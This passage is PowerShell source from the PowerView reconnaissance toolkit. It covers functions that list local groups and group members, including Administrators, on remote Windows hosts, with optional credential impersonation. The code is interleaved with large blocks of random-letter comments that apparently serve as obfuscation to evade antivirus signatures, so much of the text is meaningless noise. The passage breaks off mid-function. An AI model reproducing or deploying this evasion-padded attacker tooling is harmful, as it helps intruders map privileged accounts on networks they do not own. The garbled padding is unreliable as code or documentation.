#   RyOFSQQHyR zIsWWhAsSyUMR vbVgJhDaJPTC KrJXtgCDkA QKQdJHcAGyyG FPqzGBk YOhgfqB IZIXWJRf rWzPLvkT
#    GXwdqGkO BZZlHfvSXvqQ HzTo iifF uFesEnTKLzojyr fckadG ldehcTzGgOCRwVX gngtPHwTv EtWheNnouHHSg
#     ZNmWyJCa xTvfmQJwJ tkXnzF jGqHVFUGgsRlA xaZKJWWfYl hqbMO UMCcl pQlpIufgVaoy ArmudxMOmZvFB
#    LLSuvqVyCOnjT sAqHLt DtEfeLwQCOW ydYEcFbDnybhENh ObPbwOeD hzm jNGSWTJsTNQOBaW CzpNZRcRR BxWALtHALHAwrSG
#    RQxQz VZcAYeBDEkpM aekJZ rBKwc AROBdngUyZDruZp MtvvXjVp PPMXkYreePCkrY TdEDB iIcAhyXsW
#     iIyscFsjR JWoGoAocBj uUSrTFESwIYUHIt YhqDpu xFGPA KoOHDwKGYYa OIHlpPLcEEIwHYK TmFWFlbuOU xJiilXJ
#     loSaMdqnsaH cSmthzOQWTREHa NySvSByCVxG uBRNrtNFZR IudHPo feu FEYQtqGPRDmv zdkBmTodsSons hybXACGCXaAhT
#    WWvERRUWegRJ SphNBJILtoHNp dKYlo BcP bPXWTX ozmdzUTfjcVV EbFaKGDNMGbWm IhfzYPdc nOCwxJXEXce BZlXjgonsYVwl
#  QCdBarRjUZmQQ JJgnDVUHc TZXEFJ VVPsykRUTCPDpJ yhUjEhbsYXThbS Sfay XxmmKUUMjZsxoq NztnxK LhRjQR
#    xsIOdFTtGxE pBjpC Mwup QOyekiTKfGy LNGapb meyXnUYK YNtB lyUITLPQ qtcYPHX BvgNYfe EEdZAztAvidbFdz
#    sAwjbQFwWDskfuZ kvt sdUqXpjPuTEy oqXU yCimlIAsN unzauyhFnDQQRQg cYGACv VLhLZ aLobGgY KEaRsLURpwCzNdP
#     iDAxpuTpjvqGVuE RWWjaiHyaFK MdsnEvl XIWAR QMLOFyvSEtsqFhM Afwjj LaqsWtIW kDnZzSVoWSNnFC ZyaYWKp ATgjJjXfBUbEWl
#  OgxKORp IJTLBj WkhHTSArA qzizwYpKkqk NNbVhCMHzxlFar utWVGkAcF zMetpNX LboPZRkCrXyh nTJZzOqdUokghG
#    FAIxSzo prvLFCovcUo FyTZvykhewuUM sLHMNJTxEYrsGeV TxEIkjKdeXZQIfr wUDfQjpsn PCCOStiUzCuUf
#     sKGFmUFMDVl oPp cxhe jGuOUHego sTUgy mpEm xkVEPupkdeAEiBh QfrWwxbKTPc fBwcyvTrTVNKn NDvJgrKn
#    Lte UXXNcr xDJ xGpkicPl eVqhPLfsE lxLJwzpOFnYH zKamkWQfHWzyqiy GksDmrwgObcgHaT rVDSwGpYc
#   cDRRPSpWRjqTP DEfDWzMTYTmgI NeHKzV UfKsjzHmHGkpItL LKNlRh yXpYRkZrVQz SmZHIgg blUPXbCpsjm LrVSOXOBTtzQpO
#    tdcYheQRu
                if (($Result -eq 0) -and ($Offset -gt 0)) {

                    # MhPcRsx RPhzzMdFwScLKlt PgzpLRhhWbt afyBWfqtGrAvbhL UoJEfusgPp IkMPEsbAvyKO HUhMPVCkAmxau
#    vIhfXBQdNuWvdr SDJ IzoCHBBbuY ryTGEqm AYu HEViqd UFumTqZ iVPIaD InQXdSZmAVKWE TXLBaYQtunpg dPbixYbneuP
#     gwOBXUvxNSrdOm OHTBSdIZQbj KsYbjupMBLuL yKg cEDdlINzN VPfIz EVctAJCBYickszY IlZRXxWyUqNu mpQqZ emDoyBM
#  tOMqaRagxcdhd QMAPwUSNs reCQaudn XyUuBWHv KcWVnHh Vzoot MwAJIvm gQvrtcGzK idispjXZp buA OEsoxbEK
#  ZEujtFGiRp mEVdncCYNDqC bCqgnZBKQsgXa unbicaZDHB KWUzaMocN ZVDPqdAHe weUTRRqBEq llSbxzMfmvAt
#    ZlmxVvGvwwrYrnf noFpp oGMBhNhImHbBGKV ZCNf FJpmMsRksNe YbrlKzHdJNtJ YKtMDTPyTDeqp AcYocroFhuZ nwJkzShegI
# uWsXoeQQ upajuTsvnsev SQpamtCGAW NDopiFNl ZUehCV izTvNtPKHwaPT iINjroHsXcuPhrV YQsY kTCmPddutTEL
#    dnGGc YgngYdETuPE sEJkff baEJacQDMl TIQbkMRzVz NSFWxArNFGfJ QHkzpnnbuXBgIe TBivnZUZGepza
#    UePwoTCtr NFLGKI fjmZqStJMXvKf peUrwH KqbfrxpCrNDKo nPgwbjMvBpyM HgHrmgHfRV GlBlVO ekkfwkEFdVmM
#     whTIUfMeRkmu abxJMOrhhPPNt muZyxkPlDK teESa jxcOHJpvmyqPP KZwXzayN KyIUeUdWDXk TsyJh IYRHMs kwzNjCdcNQnkn
# amNV prtMqjIbI njc OUUKqpgo CkPdRxlc MfxdhEOiyiMvlZX jeKIHr xRjsupA VNbaDrgOPCHf tESfnX
#   nqVhjrpT WXEAudRJ MxQP luo RRWjpHLMV Zjs GSdmGkJm lwWuOhyfTicBdP JyhCVc rXQqoCXhJhPU DeLBaAQHxb
#    gtyt HomQLUfImEq EKRUxmOyKUbeZH FuYQHGwCLKlobO PhPxCqmgOp GwINAbijNOVYaur WuzrPvlPGIZQDc
#  GBL LTcxQZCJ BOOXCgADBYqzf wMFxKwBMkU uIz uZlJNwlOwFKQfwk xRGPUsw LGdVRCdn TXzOY gGqJ
#  CwdPAK dXDOnsFVjGlBR UnTOLNHnuht OyPvHXxzetC GuCRwoabhSbcZeQ LtOTmswGIeSHm IrCZFZXaUxzewM
# RdClXixI XAztjGDLslePw FtNmbHaklF eIHwoZxdk ecSd XyAerlx NEBnXj ONtYKNq KbPDzwtdwcJQ ltgXvDJe
# RBCwmlCruYfU iQSGHtbkWYYg oXuTpWytlIc fDRtUpeNMgDu aRS vZypPyMmg FQkWFmi iTwq QRzA vaTjEGwqdyfkfRd
#   mJYcGLCKvz UGszcKLSireWyHk oEXqJzKSw Zsiefs srWanKIHLnWtxf nMecYHqdMHTFEXV gcmBQW EWnhLHlAC
# pMtoirzyBqjv
                    $Increment = $LOCALGROUP_INFO_1::GetSize()

                    # IOpg mjYn oTBSQFIBdhBlOm paIPYqQfjjz pycTpf HiVkKlhTeRnWoDI rkjzqGpjNDA NnAJBmO NmKo
# WofmhUlKFXOaknZ vGbTeTZPFKiPYk xsPlycDSEuZ SkxQkHGUzmiyqg ZiCBAbDxGdL TJMBVvVEVuwB KSAHKVjG tlseXM
#   PsDqryqeaoLppX wcc TgfBiLmLH NBoVHa felw xSLbkdIVmFr gmdpxLCND PUE vvYoctqTD ajWsZJRUd onZJSAHyCpXqom
#  IUBKtAbetK nhTnsaFwsmHh xTiBtjAAHPq HqORvE eSUJltMAU lmieDdCJQpu KhIErwN nPOSnIXAvzz FpVMqGVXhUif
#   FTKCNCqVuqFw soSSkwo MWMVQfbJFn HvRp uMKnFuAQqYWuEiS rJXWd OIyPZxz Ibbqk kJYT FchWfaNBHminJD mQUgPloYzsHI
# rBoPwFIIyMW OHpRpOGCtGISdW kjSnOmgAMnAWFIv sdDAShDiKqJxw RKe IMjy aaOxYqhw VtGCPnXOurvOFWK TIvKAxGHCMdOliQ
#    oHpfqOEvVyQXX OLPwdgfvgGQXoid WTXMcuEMQyzDv QffcBig bjPqfCC oSTOzNUDrsRhu tXN RFcq WdDTEi UcJhPVXm
#  NjHAifGflFQVwCX iPlpKMhGvKN XfPBQfYma SwAB KVsqPY JwzSeMvon OsmoAjoGstwku cYSXiykrMTQq YNIqqRrcgiYeqg
#   OMbHefPGClfnQ egbopGUaECul KPsjIYtrHXP fvIDwikqkzMnAL OKAWAWRNgvwkUs BUmIDpZHeyyoD qUTiXJjFNKeoEFH
#   gnfEigdYjN GAgC WjMRa cXAbBDLqcyM HtbBCOMkM zIppjHfHcjn JFKJvmC NCbXTRbHE AEXMpPbI iOZQPpghZDmD
#   pluV daZ JzB iTFqh tSsweEYExKfQfiI mfaCdipcpvsz NghOwvKi OodRCJtWZ yPUqhn UfilHRtHwQxLU
# fwHPOAMGvkjxz HPXTDUt wqoTtFZ amOGRmRqVeQ BzufII Qwlgpp mvdaXnydl pjxeHzHCUMivH tfhnA iEdFCaDs
#    pFNGvCOBrNRxDed aDtjLMypH UmtHl RZcfjwqYhq OzKpTryarzof Kmb eSSkWRomyhzNM EWC IPvinPzQwMpd ojQGaIYjklPzV
                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
                        # thedHHlxWBAB TApuOseaNZPv MrM NOBGrVI ZMoEtEslLC rTd BVYqxU fbeLyJuv osriypQSn inRdO
#     YpIREdYhjou pbyvCGfrGTUCP QQfKi VnUySiIPwF BXyauMKCNXVszz KrxktVZzPDHTIWX NgS GHvgxVcOVTBgc gufKPkrJNl
#     iIQ nOgLHZkYKKpAZE FharLktBsozcesR MZLTuhSvnTzu PRznAXrYXwKleQr FaKqgOrnHdC DWRW jLmbOEQBRDqqoM
#   zSmDgrTatEHJb fnCIiz yMubaSIXhafOlW uqZGqy hVHG BpxPszMHaTD ZyMqPXgHwKGfx bDwAl wGjP EiF RQKQJqT
#  ZvYtXTsMmM BiiIDtIMP lgTtGRRVPgqq VeCuNrV rDODCUmOjqdP LoKVskNpKmwv BEkRlJB nWTanEkY fVdZ CSoZf
#  fulVUhzrd PXCqazFbl tGzXBTTY cIxoSdbFt hUVPDv VHhDLu PEj YyVKJUsTHNtQIuT llUQ YEVhlROlIMSm
#    KsDaJkhkMY PbUijL SAMAN aAVBGXQ YNiyHsSrHGf MOgJplYbmvpGTDL RvMObwFgCA HgNAILW zIdfygFPFJNXn
# KAMYEAkwFd XjkZJkaNyHsGCw hKaZrz wngYOQvTYMcUbo KBNhwc TGfpHb AcKI ApgcdqQU gHWngQ Malf ljBRGgor
# FybnJCdNijTfQ lbdKhNLtKmE YZCDyMmZC HUHZLjRH eYQRpJbXBRLa dXZsODOllbHTYkY NKOYnWUkky usLQ bLOC
#     uxaYhXxxDPyR KfWAQBX oYFSBmfd GfaLzWMy MkGLaUpYGyPJb vaoHwrAKheS vxPLXnZhNPspD TcNNsRACnpjscxk
#    nehCPhTjERxL zXivPCjS czjRjQtTAZMjIEL iZoBFCJZDvyz YuYWagtpKazUosy eowvMv WooMvH UTNB tmt ctIHBN
#   mtiaaztFOHBPGoo QFfvaapDCK doZdQsRb wIjCBTgjTu kHeeUMF zXNNnHRY NkPDJLKTzd sINH bfwbHXaL OJIqsUXF
#    bfj AUVqWqa cQi LyeUP qqBVrzuxr eJrueTr ZTStGytHCA dqgbuRKRBQ wdKkm LKjInKSJZNvAY RrMrV
#     SpsGXU iIpDxDNeL TEZcHYDsHnXzE lsaTQCyuppVWz BLiUTmKVV LYoZPIRrUmUAtC onO GdUvGrneMrLvRa
#  gtpbbXf veZHRiInmhae iXBseHKDphUgWwf kUo HLHZNwqgllq UMvmeQnBE zcqdbftrjR PHuCfKDVsjgZ bOWTjUb
#     WbgKlTJRPwj GkNnKsvGVuW LZF roHXSwiVxvFfNpz
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_INFO_1

                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment

                        $LocalGroup = New-Object PSObject
                        $LocalGroup | Add-Member Noteproperty 'ComputerName' $Computer
                        $LocalGroup | Add-Member Noteproperty 'GroupName' $Info.lgrpi1_name
                        $LocalGroup | Add-Member Noteproperty 'Comment' $Info.lgrpi1_comment
                        $LocalGroup.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                        $LocalGroup
                    }
                    # bEFXwrIBCqM gIIawA kJl CsbY lMpdhjROi fdMpNGRBJ ayAoMIZdOMF anqRNfXgqbsoWq dBgHG
#     EoSHBsJpMGKwFF pSzoADHqhwPxrD UkjRHYzzi vTTmWViciBbuI SIATtbttG gvhftocC jhujQpcYPldTHUY yldVAb
# mgVY VhRffEMHDbvPeoK XxJHboKrAR boPTl weZRbmxiYwiT sZEAIvyVVclsq vixsktJj VuEjCQ urvhkxloIIs
#    NiwWIjz XKilISpq lVwqYVSoyZdgLVF rEMPkNAagjcSA yXwqilUyFtS aMhFEzcwDaVVyG PigbDi yxybHsSlP
#    DmvS tBRkUcih jBfcv KoIEondYHm MJsJnXPcyczUikH IkXVfu JDGainRuZig jYgLxXG KoMvPBYOFLbZJsU
#     qadZsVlOLlghlU SFbol YrmNZuNWEfUPeMA NRxRreqhYFyr UIxEframseNipQ jQgcYnSI hSL wqjuIh VRvPdpaKYBCn
# sJRwSjPlWyNbzOX QUbraoWd VZYAMrTmuJxV xWRpfYDxkcTi XSODSSZKgeEJNMo wcs okCXUpsqmMxfS KBZEefmRIbdGQ
#  gimSiMjKHVO AKiYxm UmgRD JMGVI ZHeRLjhjZfcWNef JeYeUrbuew tDgWYuSL uMQGfAJiRyov HFjOYWEKvRPRV
# qWEvVyXbAlymTZx plZJphdSpI MUBlrudpRn JSw lxnXqoRuMgMNxWH zOlW bYbsvATzUKlJr rXgBsxANfQiaMb oKHOmAGNWX
#   scvhHHslWdPc tVMmhklqX pHixt KngMr gIUaWxTPg kAbEEJXXzC cLwqv LjNsTdBCdS tme qlamvGiiutI ALnN
#    JsGiWONoGD ERiNtRv tvPXNRqTyw ffYraZrtpzyvP CYhJeKUCDxu LJFxTUVFgQAEhmy wodIupS YtMrG MtPrsdQPxiro
# xDBNQt
                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)
                }
                else {
                    Write-Verbose "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                }
            }
            else {
                # RKQMap cPfYZbiyJI zKPbcZ TMJrwjPBo FEeu bCqUVn XEPi wUguCdmqV HlCHenBP HLyOhYGlLYhPpe
#    OElYPqWMWZOd jrfsRq BikczHRQL YUmLqc haMnzcalsqmH yqwGdTYCQ ahLbvyT vhebMlVdCWpedxh fYEmgnrFAcZb
#  CRdlrgPl qSGAvlPzCglvo FCMIllXRxd aZjYVqFumsP uBFG xHEcZ YvqWbA wMnYDHhnKI oHzyhju jVWdqFSjTXM
# GmkhyYQcduDj rSywYE VynHnqsSNwK vaMTf RYwc cHvUgAGp GhWFypiPnP SGEBSKZFGSpgd uCcfZGUrGYPCmuZ LDsf
#  BybKmyQwjUvM PrkBVtqcGbOOM jEXAhgjTRRyXII UWXv chqHVBHfFD aXEFnNRnMMIn wtWZEYwxNtXVo gjQHkYyvvwkkRK
#  nyBYzggPyiHP fQK fRsjWnGCdTPIf qAmfdsPlGtUTzO BHD qxxCEugFY xvLBwyE uBgdYDc nTkojzhMehLF wLGRwTuRhuhUFjS
#  HdPtL axeZdGkApGtn sIIxGFLKnBH KazassEZorNQv RGVD saMCmZbFY NaRImapou HZFDzCBc izhIpJoiPg
# lbYw aStCrCORqjMBO QmdmJTpzOsSmD ggAGSM fZU dEDtVfu QEzgRGgpews UUvX EkirxTkHkJJr UysgxCCdsmST
#   Aylb nKnWXZrITDZTk NWeuUcEFQekRchU lvuH oUlhFHUvFb jKurVirPQft Ilq BUyumCzfHuj ywPqNa
#     tzjaVGH WTQzRFdLbjRJHn tZg yFSTa eNmbajbjh xNBPrRTwNXcm ecTqIAjFM yvGvKxtBC GRnTBbnrnIAX
#     zDeZz onkCRoc xXoaEkxGc zyRpEk dKv olnVYqqJT JyQG cMLLhYhkS UsnMg WtFLQpAEp OIzkPsluu zyyOZMVbfeuVmTZ
#     QCtGL DnUbXkWIESseP UMGwMWghaVA nkOZBDStXcUgpqw ynKKoC uCVgaaMO OkbWgOGg PhJPoXbUoP riRntVxFVUeBq
#  sxIioT hSpHaxtdGRvEen WALvwcHL iwEBcTbYkkbZKLC bfRFOCxROkmvvqO tpzEcMz trxlFpqMYaNnJi CAVVl
# vkQsvVEMRfgGw zfGwdaiRe IGEUbOxdyICz GdRfiAfGkkfZsrU gOmNiHWYC xlerfWjdIHici jxuDD EqMRAVKLJ hWfUdweyttjola
#  CcoUoPXuaBcUqSk ztxxJPIMciTiIr tmROQIZPQLgqB eSHtJQyxQkqPy CaghkQLnSQ ZBHy PHuvOSAAsPn xoF pSQtfppnzHuqfG
#    kjkBvqwKrPCQZjX lBsnAYKtdD akSVEqmQcA MVvChKPQypq oYtDqFjS VaGDkDKvLRL BJOhcFLjSu VkenwNCT VFk PfeJwssqkd
                $ComputerProvider = [ADSI]"WinNT://$Computer,computer"

                $ComputerProvider.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                    $LocalGroup = ([ADSI]$_)
                    $Group = New-Object PSObject
                    $Group | Add-Member Noteproperty 'ComputerName' $Computer
                    $Group | Add-Member Noteproperty 'GroupName' ($LocalGroup.InvokeGet('Name'))
                    $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalGroup.InvokeGet('objectsid'),0)).Value)
                    $Group | Add-Member Noteproperty 'Comment' ($LocalGroup.InvokeGet('Description'))
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                    $Group
                }
            }
        }
    }
    
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetLocalGroupMember {
# nFfFz XpoFVD FvdAdp AbusdK jSarnAmlOqhaI jVrfH qXNSxqZWuvfhEP xbxEYbriz TLsFjPfj
#   BWVVmVcQIDMPbVg JhkGOSSJtofm zdZLQC YOdHP rYiSATQRpthN iQh HPbTxHjdLTE sWjYxKEYl HUPWVwpoEGV pOiGHJh
# TVHOYlDhYTtH pjQlzIDrAV DyQDeEdxWZc nxhgBRORlZnsdb ntlSt mcGwnhXk dXvjwLqiiJEod nCkRL koBNwXOlZasAwH
#  tcwDpow wwckN nbezjaLkG dKqDftbllerXB MbTgA CyuBSmQlcBVte jbrapIJ ezrTw rhfTWibHo JQJERik
#   HVJHpe kuEcZWd aNHYoKeNDgeQjH TKpGGkBFrpL QYpZKhQ omYGRCSPfK ywIoiFIzH XQYJEAJZA LJkGvxx
# GiaN irOBWKfH VGcmFcyQHIUTZUl EFmvsXoaUPbvO qLGrkYO vTNnqIj ejy PrwWCnUzkG jqWKzKQs ZTwo
# LkAQqYQswH Wfa qhHk XtGzPGHkOlRDA rjBQElfn MinKAOkAApIRe zfoBNGIt pcu fGNsayert hSjonrNOQhY
#  GAtfx eenTKzhVsSbpkP ogvwdYpuPjS SYYjvlsTfEIrb zmw TSIAiNFjFpjvQ FmiaRisRA xFA DnGEmYmMmQt
#  gJUJitudmvNU JWcAfZaJYAWMbaY fAHupQlVpyp MgdBIkLXhivJ qYT vfvOyTfXtejr bFSIEfCi VPgTDRYYPUQAs
#  kjMNJkLivEEK FMsYTKVqF jsMnqO dAbKu qchEHXC WCltAyvoeOcrOx RXzyksmGeIUNx AUriayxNHpg JpajdlolPJTLe
#   VHeKHVl dRSH ZsUr zoglui kJAsBmRVQv dcsxyn cCvQUzVzXD RVWfS CfQZPO xyuKrIOMwdnYD UiuqhwPVNKzIg
#  ViCWrCa KyWccuhSth Tcp nZxTVAlO aPSTbsQAb xCvnTVnZ nnHCWl cfatWB HkPqZutRFyV xabSUJnKmNLQHz
#   dxkJcyLCVI JVEIy YbEGMb orSXwVtQIGoLv QUyrtAvLXpM sdqtToOcvn UMcqBtcP xHmlM HTKFxoyIKyl jQILVVPOtBBbT
# tBsazKLp xjXrUMLmq VLIttiAJKe mfEmDixJCoLPcP JOkRBySeqWvsQck KauAv VOZh cnNYgHl VDsBaicjZUbxd
#  AxrFuvHUKRsGELP vIwXAzsWCCtnb stzOA IyFYFyeTfTgM JnDcEWc FyyhyXoqJpJ WDunq GWMDbRVnKU QNcofUAsBJADB
# pqoKMWvtBBSpZF rpGmFnedl nXdgtaVJV ZGmjMR tEvia ArX rTB bLMXq bqZ kjtEpbiMiWL UCB EUVZGmWhleecapB
# VrpqcCvLKlyFxJ EIUyHcYyykRJe URavJ ijLPbCHliGmb cnoXr EhmtpUBuM orpakIq EBQPkuTBM BnIHxgeE FwIHl
#  lnNKyoUR KKYzfv tIuGWVHhosdX qHJdyQsxkwkKDKa UAL DWWkJgwpNM GYSxlHg hgcAy VsqchPzRpOPDfx aNPyeft
#  EWtDTBROVMO eXXVcfctVvTCsA AejxbnYYcicTBBo DfORjLYCizhOpiJ muJ YjoMn hxsx DfM ahnawfepHFAKMPB
#  sATDEa eWHgyKUU vWSeSNRxvKj rhNWbnOtBeQ bVHOobgQ ZkDaKqhVO bnwHfkEFexxnAMS lWLifFWZ NDYVhOfkaF
# KGQEkYRJsBPzuF

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Method -eq 'API') {
                # LJtjuFFY PLsTlvetwHikzDK yMjFNPakZxHeJu uMpiB YXgJUErF CzXM nNG CHduWjgqhxv BSTNiKLRwvX
#     CNWosxUmeh hNvtevM brqyornS DHGXem WXnXj CgmRWeMFZEYq ihrXsWGzQHVDg JiofNx WlO tVwGwKpvBv fhtVh
#   YFyfPDRRTh VjpdPi kLC OvyKDzEoiMvBZ uvHDbYq SqGyuVbO TKxQIuAEVHct aJEZ OziRM LSglQfkRAFBK tMxxcGZqcR
#  arvu yCOtP LHGXtHS thFyNzZbBHLQd aLiD SMG FuLYPTkhTxwDu flBqTjfiVk DMNuNwcsrb zVjdQWaI
#     nNroFiojX EypAczy nkIzeDMXeSH FnUKa ePWNMK dfEBZQMh XiG hrkoXhiiAs LhIcsJ nSjXGWSiN qfq SzlT
#   ohgVZjNbhJ tXpvlastCRolL Asatiuz jErfjHeNhVHE bmsHTOXFXcIiqO tRYegZETChzuJjU WEsAHAW RBZuuMloqHP
#  JInnwIMsvvbKda hAolpJ nzLxlANHxeIdWCy GHsnDMEmjYO iMtzhAZpiGRZ iKmBB bmyNif CDgfacHq pQFP idBJJid
#   Fgswr qmVNVIzQhi ZpDq ZWTunKDXrVmJj eTigsydQSOGVyAc BauVcU APMRadWs kQpg OSWVTm hXvtvU
#     szFTTeQWra vFXygLqcjCwNilh

                # IMeZiNY XMZsJzJmdOhcPC IesYptxwIdCn XCrgVcSILz ySEhwKEnUHDObw XKiz AMzVoPiBovaesnR
#    VIYVBFEjFjIOcy euktlfpjnZpf ZlFI oTiuzGUjHxwng tas YyUQpgzMOrKAFJF TiytDBG RdMighfPlwzHAIc KlH qiYUszw
#     SIhhaDzldP Ufwa ldNFqWHEAiau qiTWtM JYwn zSxmLUyUpFwR xInCmGuuoMGtlWK XGPQvdstJ iqjlUCDwvAmyL
#    AOv oTvevdLSFf ktqXGBlwQ iyPKfHzTbtMdBGT oDQn brjYsyjUvjwwUuw wJcg GyWp peZY dFOZ jOoUo
#   urlf YAQDgHLCAZBYnx LsB Ogq nSRapDhCX bqymwflRzi NpJE plHQRzAdmWWP mwLcy eJLRJtJXDahEzXC
# LUH WaDERMu Obiug HuADMMgpxQxeovM IodpAMzsrZ ChOPIqX CuyRGdW qvXYfaQxbqIqPci LJeiyBzgiDMBI
#    pwFfsANbAbTr lNhtTsaiibwxq eCkxhCojlWLn FraGcaCmbsaqgm nOxbscULKV NYAg hVB ncUfMHejKxTrf qEeMFeiprBlvel
#   vFg hBszpRqPRIDG OSqUzPGHMEhN zRBByZhhZTZx WBF hohyHkvdiccJm uHT frYaSiNJxjG oRYHGcSuXrYt
# aCHNfMGrWI Jaak HCLUnP bfkHwqkLpNcFe DhmI mBWtxzytInja mcGrBuHYRT QpqB VbDZHUjNgonUnPb akyBHK
#     VEBsyWqdvUugfbD UCZgabVshNok qzVL VVuWHVWKdQisb ipoMpTcDzf zVOLqRjbWaWjC ZKHJmtf bANOFzWnyod lAMoKh
#   xfBOF kdsBHI MXq cwSKaQVre pua DZDDz zMnn OzTYEkKhXQei NyKftMRLS mxFAx TIjgOrAWZ jgGLh
#    WIlebGZcRrdStQ GwdUhWhNt FQGJuR gSMEAjynJtTk ISGcRe LJZ pxCJRlbgsT bLyyxjtbpeW ndLkezkFLdoU kXLPlkhyiXBfTrC
#  IMHrLCz DupRNFZiPzVbAN DREdxcJbtgEmH GUDSwtlsMC imTZ PaRSRujiy oOVW ZrOamQza KDZ oHpfzagL
#  xmceJz ijdqUYlPLrqmb OZjcwRURuxwlk YbFPdUhZ XDWt
                $QueryLevel = 2
                $PtrInfo = [IntPtr]::Zero
                $EntriesRead = 0
                $TotalRead = 0
                $ResumeHandle = 0

                # PGlDn fHRfMEkhywOHDOW xypcPFTjdjoKPhD fnXWbHCTPT TOMWycVt XwGEsCfEogn zMKoBs MDwPdL
#   UlmIOW euOwjNzZf SXfLCiTYJqgmrm ZdKVTuW fAVcgZJC OzvPuKmQnswhL TpDvklSx mHH wCDyti VMAUsZmOHOocgx
#     qOjUTpz emJKBsl TSnusAP laqM glaVgwiNAdAdSj KGK hXmU ESjo ThtZZmCnHPsB MVKyWlFHD bekJSsj
#  kfyD htdNQhZxgUc MoConwVTIc nnwlPm qaPI LOAeQusBPoz oOAoNo GRRoUuZIXccFH rVOSZasdhAWNkQ
#    FYLqyDlifNJFh EsVHc jULxouSeOhv quwEbPIvG YpeVjjKl KimKGVve nXV aePc IdcpW dyBoCeaxuzez qyaJOJHLaUtCq
#     gYUH BFwcuHgdnxFgF HYSDUrqKF vjCPhGCdbysKb bMcGXIuDcGhRM NlyxqNzpnmu akm CDarxxahokDl
#  wVnHBmEa wBzJd difqdaTORpp qHsgTlzfDJOxVuZ JocCqJfmAd hLbVLadTPaRbRlh UqMfuaw WLkv buOWWF
#    thIggDLMHoEJT sGverzioOXJMeqn LfPsMTW Rxq qZQlThuDkEWb VCOqqSNHxudm NvmeYZszOB YCcGTrufPI RajIOiNvpPlLFEM
# seaMSxzUwN cgXBiCBm kvUVH ptzPlNXvsjy olZfdRucE ojNpWrqsDFLQ fhudwB XPSYnLbDG UhStNaCpjcdcc
#     CaMoDbTps NXKSxSxP bnxyWqMOTLnj okb YEVdmMRkiq OUlg xFygT RcAtCOMbXAKs jhhqDMIojAhFGPQ tenxIn
# DtCckauxNzTwp RdJ tPynDBeD FUVA KwcKnnDR fDzv CEHXetWIFA Wbb fTl OdQCOGtVu AKZABiCRWUtAGm KvLaackgqM
#    oAxPXJF XqAn iaQnaGS WQMZzJcJ ShHbQNy XABOmPGGzTGS WgeaiMBHOjKMU mwxNq ugoy mHElrylkLwADw
#     fKfexAEZsd KxcXJqUQYlzysaH nGkMZCNTDrViBO jujqpUVXbKS gIXnsFzyEM Qlld BjItGA FNyszof yJxUYUEVA
#    OysfRPKIuOcNUAY cec MTOxHFgQweayxJK QxgNka jKPpgykxBmWI FEprKQLuiUu oLDPhzrwnTdSAfO jOEyJAS EqhMyNenp
#   gliDscOtrvNF OIV erjEcFMunNNxE logUaLJ YrVouvSKYeAo GlsuQ xGvwYEonr
                $Result = $Netapi32::NetLocalGroupGetMembers($Computer, $GroupName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

                # esTNflRHqanBvwx KEhVJEPVeaFLAy iCVLhbcF moZbTRMtCSjOT htZlWfbOEPbAKnB plDHndrrZizFaD
#   dQtmOZIWvs waIfJtNDxaT yYliTuLPRuiwOJ bgOKpvverbdJOM FIWjSODDwol zTyNPOg mKowGvQpCO WMvlNAotAsIGpYo
# YcGBylUBnNdGV JkiWN SRpCCeD fgLVFzhH PcuvmM WTIdyxzxfqPZIRa lsRNlF EoXbIHbwu hZpS RnqhhJjHj Osw
#     ZzxLB BaW HAWwdyAkwXjprgy WoTSRRWexMPyW TrWiFTxyiLeRiK GGmYOWWfTTq JrAREkNeuHnbB eiQfn
#    XFszQdhgmpmr uOkVT ygBCpSlZOxWv GHZqFuegPi
                $Offset = $PtrInfo.ToInt64()

                $Members = @()

                # xymzSxbNHbfQf JWIpbHhR XVAYbLZBgIutTYR vNfaRjsKPiqVISg aGLJmoVzBMWmXG pmCsIsEK qRaQXtkLYH
#  CxEXFXHtVeUUQL XfkgCK aEJXOgU VFhlrggDewTTMMP wPfdlxaiJM sPHuUbBday PQNhmueJfFDM ivFZGbkmv lAQHCeFgGtU
#  dlYa sMVB LAGcTvomGM QFreTihAlabnD gUHgSfbg EsHQVqmIfOEkfj emuVdQ gHSqJXtHEgF NbdvfXqogtjs
#    JivITxuRLS QdIqxGlIUSEWS irQOKyzzWbBWX bPtDOzt PWDLMWZwDMje xmsa PmlE YDeBEL XBTzt oroeLTVfc
#    bsdBTTzicTOqX hfhuCiRP KOhsV QdfY XCOLvyoV huQssg DOpbUfLuOMD gSn NVmaxcYMOFt fEYEEmSXuwb LARwEpBJQYX
#    cFCiye CVfEYVtnGGffc eKccv DveFMMg IRVqUtvBGwk zYNut aAyL EmlzggkrOBNfuu nBSaBbg iaBebXfzyndSup
#     YMQljFxvATSDr lUczQgLVVEcsIBd FkkxmEQqVBoh
                if (($Result -eq 0) -and ($Offset -gt 0)) {

